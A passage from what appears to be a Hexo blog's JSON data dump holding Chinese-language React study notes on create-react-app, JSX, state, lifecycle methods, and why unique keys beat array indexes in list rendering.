&lt;li&gt;{this.state.time}&lt;/li&gt;\n      &lt;/ul&gt;\n      )\n  }\n}\n//抛出 App\nexport default App;\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p></p><h2>入门</h2><p></p>\n<p><ol><br>  <li>一个核心思想——组件化</li><br>  <li>两位带头大哥——react &amp; react-dom</li><br>  <li>一个基本运作方式——数据驱动视图</li><br>  <li>一位神秘卧底——jsx语法</li><br>  <li>三位护法——state（状态）、props（属性）、refs（实例）</li><br>  <li>一群打杂小弟——生命周期</li><br></ol></p>\n<p><br>create-React-app是一个全局的命令行工具用来创建一个新的项目<br>react-scripts是一个生成的项目所需要的开发依赖<br></p><br><p><br>一般我们开始创建react应用程序的时候，要自己通过npm或者安装项目的全部依赖，再写webpack.config.js，一系列复杂的配置，搭建好开发环境后写src源代码<br></p><br><p><br>现在如果你正在搭建react运行环境，使用create-react-app去自动构建你的程序。你的项目所在的文件夹下是没有配置文件的。react-scripts是唯一的额外的构造依赖<br></p><br><p><br>在你的package.json中，你的运行环境将有每一个你需要用来构建一个现代应用程序所需要的依赖，在配置文件中编写的配置代码，React脚本都帮你写了，比如：react-scripts帮你自动下载需要的webpack-dev-server依赖，然后react脚本自己写了一个nodejs服务端的脚本代码start.js来实例化.<br></p><br><p><br>WebpackDevServer，并且运行启动了一个使用express的Http服务器，现在你只需要专心写SRC源代码就可以了。省去了很多精力，最适合快速上手一个演示了。<br></p><br><h5>React-scripts有以下支持，都帮你配置好了：</h5><br><p>React，JSX，ES6和Flow语法支持。</p><br><p>ES6之外的语言扩展像对象扩展运算符。</p><br><p>直接从JavaScript导入CSS和图像文件。</p><br><p>自动翻译CSS，所以你不需要-webkit或其他前缀。</p><br><p>一个构建脚本来捆绑JS，CSS，和图像进行生产，具有源代码图。</p>\n\n<p></p><h3>示例:</h3><p></p>\n<p><div>index:</div><br>    // 1.引入两位带头大哥 react和react-dom<br>    import React from ‘react’<br>    import ReactDom from ‘react-dom’<br>    // 引入App组件<br>    import App from ‘./App’<br>    import logo from ‘./logo.svg’<br>    // ReactDom负责控制页面的内容 但是使用ReactDom 必须依赖React<br>    // 第一个参数 是渲染的元素(必须是闭合标签)  第二个参数是渲染的位置<br>    ReactDom.render(<br>      //<div><br>        //<h1>今天学习了react</h1><br>        //<h2>这是一个h2标签</h2><br>        //<img src=\"{logo}\" alt=\"\"><br>        //<app><br>      //</app></div>,<br>      document.getElementById(‘root’)<br>    )<br>    // jsx ==== javascript +xml  神秘的卧底<br>    // 可以在js语言中 插入 xml(html)语言  语法糖  每一个XML标签都会被JSX转换工具转换成纯Javascript代码</p>\n<p><div>app:</div><br>    import React,{Component} from ‘react’<br>    import ‘./App.css’<br>    class App extends Component{<br>      constructor(){<br>        super()<br>        console.log(this)<br>        this.state = {<br>          name:’焦洋’,<br>          time:(new Date()).toLocaleTimeString()<br>        }<br>        setInterval(()=&gt;{<br>          // 在react中 修改state  不能直接修改 必须通过调用this.setState()<br>          // 修改我们的时间<br>          // console.log(this);<br>          this.setState({<br>            time:(new Date()).toLocaleTimeString()<br>          })<br>        },1000)<br>      }<br>      say(){<br>        return ‘say Hello’<br>      }</p>\n<pre><code>  // 引入一个打杂的小弟  生命周期 方法\n  render(){\n    // var s = &apos;abc&apos;\n    // {} 插值 插槽  &lt;%= %&gt; 插值即可以插变量 也可以插函数\n    return (\n      &lt;ul&gt;\n        &lt;li&gt;1&lt;/li&gt;\n        &lt;li className=&apos;li2&apos;&gt;{3&gt;4 ? &apos;真的&apos; : &apos;假的&apos;}&lt;/li&gt;\n        &lt;li&gt;{this.say()}&lt;/li&gt;\n        &lt;li&gt;{111}&lt;/li&gt;\n        &lt;li&gt;{this.state.name}&lt;/li&gt;\n        &lt;li&gt;{this.state.time}&lt;/li&gt;\n      &lt;/ul&gt;\n      )\n  }\n}\n//抛出 App\nexport default App;\n</code></pre>"},{"title":"React中key的必要性与使用","date":"2018-12-10T06:48:00.000Z","_content":"# React中key的必要性与使用\n关键词：`diff算法` `唯一标识` \n\n当React作`diff`时，只要子元素有`key`属性，便会去原`v-dom`树中相应位置（`当前横向比较的层级`）寻找是否有`同key元素`，比较它们`是否完全相同`，`若是则复用`该元素，免去不必要的操作。\n\nkey必须是`字符串`类型，它的取值可以用数据对象的某个唯一属性，或是对数据进行`hash`来生成key。\n\n**强烈 不推荐 用数组index来作为key**。如果数据更新仅仅是数组重新排序或在其中间位置插入新元素，那么视图元素都将重新渲染。来看下例子：\n\n````\n<ul>{list.map((v,idx)=><li key={idx}>{v}</li>)}</ul>\n// ['a','b','c']=>\n<ul>\n    <li key=\"0\">a</li>\n    <li key=\"1\">b</li>\n    <li key=\"2\">c</li>\n</ul>\n// 数组重排 -> ['c','a','b'] =>\n<ul>\n    <li key=\"0\">c</li>\n    <li key=\"1\">a</li>\n    <li key=\"2\">b</li>\n</ul>\n````\n\nReact发现key为0,1,2的元素的text都变了，将会`修改`三者的html，而不是`移动`它们。\n\n## 渲染同类型元素不带key只会产生性能问题; 如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。\n\n````\n{this.state.type ? \n  (<div><Son_1 /><Son_2 /></div>)\n  : (<div><Son_2 /><Son_1 /></div>)\n}\n````\n\n如上述代码，每次按下按钮，原 Son_1与Son_2 `组件的实例都将被销毁`，`并创建新的Son_1与Son_2实例`，`不能继承原来的状态`；而它们实际上只是调换了位置。给它们`加上key可避免`问题：\n\n````\n{this.state.type ? \n    (<div><Son_1 key=\"1\"/><Son_2 key=\"2\"/></div>)\n    : (<div><Son_2 key=\"2\"/><Son_1 key=\"1\"/></div>)\n}\n````\n**结论：**\n1. 使用唯一`id`作为`key`比使用 `index` 作为 `key` 性能更好\n2. 移动节点比修改节点的html 性能更好\n\n**分析补充：**\\\n使用 index 作为 key 某些情况下影响性能。\\\n举个例子: \n一个数组[a,b]，渲染成两个不同类型的节点，key用index。然后数组变成[b,a]，\\\n再次渲染时，react`先判断变化前后同key的虚拟节点`是否相等，发现节点类型就不同，接下来的操作就是新建两个dom节点去替换原来的节点。这种情况下key等于没用。而如果用唯一id，react会知道同key节点没有变化，只是换了位置，只要打个移动节点的patch到dom上，而不是新建替换。\n另外修改节点可能修改量无限大啊","source":"_posts/FrontEnd/WebFrameWork/React/React中key的必要性与使用.md","raw":"---\ntitle: React中key的必要性与使用\ndate: 2018-12-10 14:48:00\ntags: react-key\ncategories: React\n---\n# React中key的必要性与使用\n关键词：`diff算法` `唯一标识` \n\n当React作`diff`时，只要子元素有`key`属性，便会去原`v-dom`树中相应位置（`当前横向比较的层级`）寻找是否有`同key元素`，比较它们`是否完全相同`，`若是则复用`该元素，免去不必要的操作。\n\nkey必须是`字符串`类型，它的取值可以用数据对象的某个唯一属性，或是对数据进行`hash`来生成key。\n\n**强烈 不推荐 用数组index来作为key**。如果数据更新仅仅是数组重新排序或在其中间位置插入新元素，那么视图元素都将重新渲染。来看下例子：\n\n````\n<ul>{list.map((v,idx)=><li key={idx}>{v}</li>)}</ul>\n// ['a','b','c']=>\n<ul>\n    <li key=\"0\">a</li>\n    <li key=\"1\">b</li>\n    <li key=\"2\">c</li>\n</ul>\n// 数组重排 -> ['c','a','b'] =>\n<ul>\n    <li key=\"0\">c</li>\n    <li key=\"1\">a</li>\n    <li key=\"2\">b</li>\n</ul>\n````\n\nReact发现key为0,1,2的元素的text都变了，将会`修改`三者的html，而不是`移动`它们。\n\n## 渲染同类型元素不带key只会产生性能问题; 如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。\n\n````\n{this.state.type ? \n  (<div><Son_1 /><Son_2 /></div>)\n  : (<div><Son_2 /><Son_1 /></div>)\n}\n````\n\n如上述代码，每次按下按钮，原 Son_1与Son_2 `组件的实例都将被销毁`，`并创建新的Son_1与Son_2实例`，`不能继承原来的状态`；而它们实际上只是调换了位置。给它们`加上key可避免`问题：\n\n````\n{this.state.type ? \n    (<div><Son_1 key=\"1\"/><Son_2 key=\"2\"/></div>)\n    : (<div><Son_2 key=\"2\"/><Son_1 key=\"1\"/></div>)\n}\n````\n**结论：**\n1. 使用唯一`id`作为`key`比使用 `index` 作为 `key` 性能更好\n2. 移动节点比修改节点的html 性能更好\n\n**分析补充：**\\\n使用 index 作为 key 某些情况下影响性能。\\\n举个例子: \n一个数组[a,b]，渲染成两个不同类型的节点，key用index。然后数组变成[b,a]，\\\n再次渲染时，react`先判断变化前后同key的虚拟节点`是否相等，发现节点类型就不同，接下来的操作就是新建两个dom节点去替换原来的节点。这种情况下key等于没用。而如果用唯一id，react会知道同key节点没有变化，只是换了位置，只要打个移动节点的patch到dom上，而不是新建替换。\n另外修改节点可能修改量无限大啊","slug":"FrontEnd/WebFrameWork/React/React中key的必要性与使用","published":1,"updated":"2018-12-10T07:05:11.301Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2500dnzodv86t3auq4","content":"<h1 id=\"React中key的必要性与使用\"><a href=\"#React中key的必要性与使用\" class=\"headerlink\" title=\"React中key的必要性与使用\"></a>React中key的必要性与使用</h1><p>关键词：<code>diff算法</code> <code>唯一标识</code> </p>\n<p>当React作<code>diff</code>时，只要子元素有<code>key</code>属性，便会去原<code>v-dom</code>树中相应位置（<code>当前横向比较的层级</code>）寻找是否有<code>同key元素</code>，比较它们<code>是否完全相同</code>，<code>若是则复用</code>该元素，免去不必要的操作。</p>\n<p>key必须是<code>字符串</code>类型，它的取值可以用数据对象的某个唯一属性，或是对数据进行<code>hash</code>来生成key。</p>\n<p><strong>强烈 不推荐 用数组index来作为key</strong>。如果数据更新仅仅是数组重新排序或在其中间位置插入新元素，那么视图元素都将重新渲染。来看下例子：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;ul&gt;&#123;list.map((v,idx)=&gt;&lt;li key=&#123;idx&#125;&gt;&#123;v&#125;&lt;/li&gt;)&#125;&lt;/ul&gt;</span><br><span class=\"line\">// [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;]=&gt;</span><br><span class=\"line\">&lt;ul&gt;</span><br><span class=\"line\">    &lt;li key=&quot;0&quot;&gt;a&lt;/li&gt;</span><br><span class=\"line\">    &lt;li key=&quot;1&quot;&gt;b&lt;/li&gt;</span><br><span class=\"line\">    &lt;li key=&quot;2&quot;&gt;c&lt;/li&gt;</span><br><span class=\"line\">&lt;/ul&gt;</span><br><span class=\"line\">// 数组重排 -&gt; [&apos;c&apos;,&apos;a&apos;,&apos;b&apos;] =&gt;</span><br><span class=\"line\">&lt;ul&gt;</span><br><span class=\"line\">    &lt;li key=&quot;0&quot;&gt;c&lt;/li&gt;</span><br><span class=\"line\">    &lt;li key=&quot;1&quot;&gt;a&lt;/li&gt;</span><br><span class=\"line\">    &lt;li key=&quot;2&quot;&gt;b&lt;/li&gt;</span><br><span class=\"line\">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>\n<p>React发现key为0,1,2的元素的text都变了，将会<code>修改</code>三者的html，而不是<code>移动</code>它们。</p>\n<h2 id=\"渲染同类型元素不带key只会产生性能问题-如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。\"><a href=\"#渲染同类型元素不带key只会产生性能问题-如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。\" class=\"headerlink\" title=\"渲染同类型元素不带key只会产生性能问题; 如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。\"></a>渲染同类型元素不带key只会产生性能问题; 如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;this.state.type ? </span><br><span class=\"line\">  (&lt;div&gt;&lt;Son_1 /&gt;&lt;Son_2 /&gt;&lt;/div&gt;)</span><br><span class=\"line\">  : (&lt;div&gt;&lt;Son_2 /&gt;&lt;Son_1 /&gt;&lt;/div&gt;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如上述代码，每次按下按钮，原 Son_1与Son_2 <code>组件的实例都将被销毁</code>，<code>并创建新的Son_1与Son_2实例</code>，<code>不能继承原来的状态</code>；而它们实际上只是调换了位置。给它们<code>加上key可避免</code>问题：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;this.state.type ? </span><br><span class=\"line\">    (&lt;div&gt;&lt;Son_1 key=&quot;1&quot;/&gt;&lt;Son_2 key=&quot;2&quot;/&gt;&lt;/div&gt;)</span><br><span class=\"line\">    : (&lt;div&gt;&lt;Son_2 key=&quot;2&quot;/&gt;&lt;Son_1 key=&quot;1&quot;/&gt;&lt;/div&gt;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>结论：</strong></p>\n<ol>\n<li>使用唯一<code>id</code>作为<code>key</code>比使用 <code>index</code> 作为 <code>key</code> 性能更好</li>\n<li>移动节点比修改节点的html 性能更好</li>\n</ol>\n<p><strong>分析补充：</strong>\\<br>使用 index 作为 key 某些情况下影响性能。\\<br>举个例子:<br>一个数组[a,b]，渲染成两个不同类型的节点，key用index。然后数组变成[b,a]，\\<br>再次渲染时，react<code>先判断变化前后同key的虚拟节点</code>是否相等，发现节点类型就不同，接下来的操作就是新建两个dom节点去替换原来的节点。这种情况下key等于没用。而如果用唯一id，react会知道同key节点没有变化，只是换了位置，只要打个移动节点的patch到dom上，而不是新建替换。<br>另外修改节点可能修改量无限大啊</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"React中key的必要性与使用\"><a href=\"#React中key的必要性与使用\" class=\"headerlink\" title=\"React中key的必要性与使用\"></a>React中key的必要性与使用</h1><p>关键词：<code>diff算法</code> <code>唯一标识</code> </p>\n<p>当React作<code>diff</code>时，只要子元素有<code>key</code>属性，便会去原<code>v-dom</code>树中相应位置（<code>当前横向比较的层级</code>）寻找是否有<code>同key元素</code>，比较它们<code>是否完全相同</code>，<code>若是则复用</code>该元素，免去不必要的操作。</p>\n<p>key必须是<code>字符串</code>类型，它的取值可以用数据对象的某个唯一属性，或是对数据进行<code>hash</code>来生成key。</p>\n<p><strong>强烈 不推荐 用数组index来作为key</strong>。如果数据更新仅仅是数组重新排序或在其中间位置插入新元素，那么视图元素都将重新渲染。来看下例子：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;ul&gt;&#123;list.map((v,idx)=&gt;&lt;li key=&#123;idx&#125;&gt;&#123;v&#125;&lt;/li&gt;)&#125;&lt;/ul&gt;</span><br><span class=\"line\">// [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;]=&gt;</span><br><span class=\"line\">&lt;ul&gt;</span><br><span class=\"line\">    &lt;li key=&quot;0&quot;&gt;a&lt;/li&gt;</span><br><span class=\"line\">    &lt;li key=&quot;1&quot;&gt;b&lt;/li&gt;</span><br><span class=\"line\">    &lt;li key=&quot;2&quot;&gt;c&lt;/li&gt;</span><br><span class=\"line\">&lt;/ul&gt;</span><br><span class=\"line\">// 数组重排 -&gt; [&apos;c&apos;,&apos;a&apos;,&apos;b&apos;] =&gt;</span><br><span class=\"line\">&lt;ul&gt;</span><br><span class=\"line\">    &lt;li key=&quot;0&quot;&gt;c&lt;/li&gt;</span><br><span class=\"line\">    &lt;li key=&quot;1&quot;&gt;a&lt;/li&gt;</span><br><span class=\"line\">    &lt;li key=&quot;2&quot;&gt;b&lt;/li&gt;</span><br><span class=\"line\">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>\n<p>React发现key为0,1,2的元素的text都变了，将会<code>修改</code>三者的html，而不是<code>移动</code>它们。</p>\n<h2 id=\"渲染同类型元素不带key只会产生性能问题-如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。\"><a href=\"#渲染同类型元素不带key只会产生性能问题-如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。\" class=\"headerlink\" title=\"渲染同类型元素不带key只会产生性能问题; 如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。\"></a>渲染同类型元素不带key只会产生性能问题; 如果渲染的是不同类型的状态性组件，组件将会被替换，状态丢失。</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;this.state.type ? </span><br><span class=\"line\">  (&lt;div&gt;&lt;Son_1 /&gt;&lt;Son_2 /&gt;&lt;/div&gt;)</span><br><span class=\"line\">  : (&lt;div&gt;&lt;Son_2 /&gt;&lt;Son_1 /&gt;&lt;/div&gt;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如上述代码，每次按下按钮，原 Son_1与Son_2 <code>组件的实例都将被销毁</code>，<code>并创建新的Son_1与Son_2实例</code>，<code>不能继承原来的状态</code>；而它们实际上只是调换了位置。给它们<code>加上key可避免</code>问题：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;this.state.type ? </span><br><span class=\"line\">    (&lt;div&gt;&lt;Son_1 key=&quot;1&quot;/&gt;&lt;Son_2 key=&quot;2&quot;/&gt;&lt;/div&gt;)</span><br><span class=\"line\">    : (&lt;div&gt;&lt;Son_2 key=&quot;2&quot;/&gt;&lt;Son_1 key=&quot;1&quot;/&gt;&lt;/div&gt;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>结论：</strong></p>\n<ol>\n<li>使用唯一<code>id</code>作为<code>key</code>比使用 <code>index</code> 作为 <code>key</code> 性能更好</li>\n<li>移动节点比修改节点的html 性能更好</li>\n</ol>\n<p><strong>分析补充：</strong>\\<br>使用 index 作为 key 某些情况下影响性能。\\<br>举个例子:<br>一个数组[a,b]，渲染成两个不同类型的节点，key用index。然后数组变成[b,a]，\\<br>再次渲染时，react<code>先判断变化前后同key的虚拟节点</code>是否相等，发现节点类型就不同，接下来的操作就是新建两个dom节点去替换原来的节点。这种情况下key等于没用。而如果用唯一id，react会知道同key节点没有变化，只是换了位置，只要打个移动节点的patch到dom上，而不是新建替换。<br>另外修改节点可能修改量无限大啊</p>\n"},{"title":"React-02","date":"2017-09-14T14:51:40.000Z","archives":"前端","_content":"React作用：提供jsx的语法糖支持和Component的功能\nReactDom作用：渲染虚拟Dom和控制桌面内容\nReactDom.render(){渲染虚拟Dom,Element元素}\n\n核心概念：组件化！\n组件：创建一个构造函数，使用ES6语法。\n````\nclass App extends Component{\n  constructor(){  //（ES6提供方法）\n    和 super()结合使用,来继承Compoent的方法\n    引入护法 state 状态（数据驱动视图）\n    //所有初始化属性都会存放在state\n    this.state={\n      count:0;\n    }\n  }\n  xxx(){//其他自定义事件}\n  '{}'在任何地方都能插值\n  render(){   //（React提供方法）\n    *React插入事件的方法\n    '{}'大括号的用法\n    <button onClick={this.clickHandler}>点我</button>\n  }\n  //React里面function的=>(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this\n  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法\n  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次\n}\n````\n01.19分分析state和生命周期的匹配与使用\n\n小心this的指向！\n\n09-14 02 29分 :\n插值数组\n\n\n","source":"_posts/FrontEnd/WebFrameWork/React/React-02.md","raw":"---\ntitle: React-02\ndate: 2017-09-14 22:51:40\ntags: React\narchives: 前端\ncategories: 前端\n---\nReact作用：提供jsx的语法糖支持和Component的功能\nReactDom作用：渲染虚拟Dom和控制桌面内容\nReactDom.render(){渲染虚拟Dom,Element元素}\n\n核心概念：组件化！\n组件：创建一个构造函数，使用ES6语法。\n````\nclass App extends Component{\n  constructor(){  //（ES6提供方法）\n    和 super()结合使用,来继承Compoent的方法\n    引入护法 state 状态（数据驱动视图）\n    //所有初始化属性都会存放在state\n    this.state={\n      count:0;\n    }\n  }\n  xxx(){//其他自定义事件}\n  '{}'在任何地方都能插值\n  render(){   //（React提供方法）\n    *React插入事件的方法\n    '{}'大括号的用法\n    <button onClick={this.clickHandler}>点我</button>\n  }\n  //React里面function的=>(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this\n  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法\n  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次\n}\n````\n01.19分分析state和生命周期的匹配与使用\n\n小心this的指向！\n\n09-14 02 29分 :\n插值数组\n\n\n","slug":"FrontEnd/WebFrameWork/React/React-02","published":1,"updated":"2018-09-05T06:33:18.479Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2700dpzodvhpka0d4p","content":"<p>React作用：提供jsx的语法糖支持和Component的功能<br>ReactDom作用：渲染虚拟Dom和控制桌面内容<br>ReactDom.render(){渲染虚拟Dom,Element元素}</p>\n<p>核心概念：组件化！<br>组件：创建一个构造函数，使用ES6语法。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class App extends Component&#123;</span><br><span class=\"line\">  constructor()&#123;  //（ES6提供方法）</span><br><span class=\"line\">    和 super()结合使用,来继承Compoent的方法</span><br><span class=\"line\">    引入护法 state 状态（数据驱动视图）</span><br><span class=\"line\">    //所有初始化属性都会存放在state</span><br><span class=\"line\">    this.state=&#123;</span><br><span class=\"line\">      count:0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  xxx()&#123;//其他自定义事件&#125;</span><br><span class=\"line\">  &apos;&#123;&#125;&apos;在任何地方都能插值</span><br><span class=\"line\">  render()&#123;   //（React提供方法）</span><br><span class=\"line\">    *React插入事件的方法</span><br><span class=\"line\">    &apos;&#123;&#125;&apos;大括号的用法</span><br><span class=\"line\">    &lt;button onClick=&#123;this.clickHandler&#125;&gt;点我&lt;/button&gt;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  //React里面function的=&gt;(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this</span><br><span class=\"line\">  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法</span><br><span class=\"line\">  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>01.19分分析state和生命周期的匹配与使用</p>\n<p>小心this的指向！</p>\n<p>09-14 02 29分 :<br>插值数组</p>\n","site":{"data":{}},"excerpt":"","more":"<p>React作用：提供jsx的语法糖支持和Component的功能<br>ReactDom作用：渲染虚拟Dom和控制桌面内容<br>ReactDom.render(){渲染虚拟Dom,Element元素}</p>\n<p>核心概念：组件化！<br>组件：创建一个构造函数，使用ES6语法。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class App extends Component&#123;</span><br><span class=\"line\">  constructor()&#123;  //（ES6提供方法）</span><br><span class=\"line\">    和 super()结合使用,来继承Compoent的方法</span><br><span class=\"line\">    引入护法 state 状态（数据驱动视图）</span><br><span class=\"line\">    //所有初始化属性都会存放在state</span><br><span class=\"line\">    this.state=&#123;</span><br><span class=\"line\">      count:0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  xxx()&#123;//其他自定义事件&#125;</span><br><span class=\"line\">  &apos;&#123;&#125;&apos;在任何地方都能插值</span><br><span class=\"line\">  render()&#123;   //（React提供方法）</span><br><span class=\"line\">    *React插入事件的方法</span><br><span class=\"line\">    &apos;&#123;&#125;&apos;大括号的用法</span><br><span class=\"line\">    &lt;button onClick=&#123;this.clickHandler&#125;&gt;点我&lt;/button&gt;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  //React里面function的=&gt;(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this</span><br><span class=\"line\">  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法</span><br><span class=\"line\">  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>01.19分分析state和生命周期的匹配与使用</p>\n<p>小心this的指向！</p>\n<p>09-14 02 29分 :<br>插值数组</p>\n"},{"title":"React学习笔记","date":"2018-09-05T09:45:25.000Z","_content":"## 第一步 实现功能模块\n1. npm install antd --save-dev\n2. import 'antd css style sheets'\n3. 创建 模板\n4. import {Menu, Table, Pagination} from 'antd';\n5. 导出模板到 ./index.js\n6. Router 注册； Nav 里面 添加 路由 link\nCompelite\n\n## 四大部分(`props` `state` `lifecircle` `context`)\n\n## 组件构建三种方法\n① React.createClass\n````\nconst Button = React.createClass({\n  // method/lifecircle\n})\n````\n② ES6class\n\n③ 无状态函数\n无状态组件只传入`props`和`context`,不存在`state`.\n`propsTyps`和`defaultProps` 可通过 向 方法 设置 静态属性\n\n## 组件五种形式\n[`容器`, `业务逻辑`, `取数据`, `布局(layout)`, `无状态组件`]\n\n## 生命周期(lifecircle)\n[参考文档](https://segmentfault.com/a/1190000004168886)\n**初始化:** \n````\nconstructor\ncomponentWillMount\n+ render()\ncomponentDidMount\n````\n\n**周期改变:**(`props/state` 改变时 触发)\n````\ncomponentWillReceiveProps(nextProps) {\n  <!-- 当组件可能接收到`新道具`时调用。即使道具没有改变，你也可以这样称呼它，所以如果你只想处理改变，一定要比较新的和现有的道具。 -->\n  <!-- 调用组件setstate通常不会触发这种方法。 -->\n}\nshouldComponentUpdate(nextProps, nextState) \ncomponentWillUpdata() {\n  <!-- willUpdata 下 设置 setState 会触发 componentReceiveProps -->\n}\n+ render()\ncomponentDidUpdata\n````\n\n**组件销毁:**\n````\ncomponentDis\n````\n\n## 单向数据流\n被动接收 => 数据流逻辑\n\n## 无状态组件如何避免`重绘(reflow)`/`重排版(repaint)`\n\n## React 路由跳转\n````\n  this.props.history.push('/login')\n````\n\n## React.Children.map渲染对象\n````\n{\n    React.Children.map(children, (child) => {\n        return <Fragment>{child}</Fragment>\n    })\n}\n````\n\n## React-router 去掉url上的#\n````\nimport {browserHistory} from 'react-router'\n<Router history={browserHistory}>\n...\n</Router>\n````\n\n","source":"_posts/FrontEnd/WebFrameWork/React/React学习笔记.md","raw":"---\ntitle: React学习笔记\ndate: 2018-09-05 17:45:25\ntags: \ncategories: \n---\n## 第一步 实现功能模块\n1. npm install antd --save-dev\n2. import 'antd css style sheets'\n3. 创建 模板\n4. import {Menu, Table, Pagination} from 'antd';\n5. 导出模板到 ./index.js\n6. Router 注册； Nav 里面 添加 路由 link\nCompelite\n\n## 四大部分(`props` `state` `lifecircle` `context`)\n\n## 组件构建三种方法\n① React.createClass\n````\nconst Button = React.createClass({\n  // method/lifecircle\n})\n````\n② ES6class\n\n③ 无状态函数\n无状态组件只传入`props`和`context`,不存在`state`.\n`propsTyps`和`defaultProps` 可通过 向 方法 设置 静态属性\n\n## 组件五种形式\n[`容器`, `业务逻辑`, `取数据`, `布局(layout)`, `无状态组件`]\n\n## 生命周期(lifecircle)\n[参考文档](https://segmentfault.com/a/1190000004168886)\n**初始化:** \n````\nconstructor\ncomponentWillMount\n+ render()\ncomponentDidMount\n````\n\n**周期改变:**(`props/state` 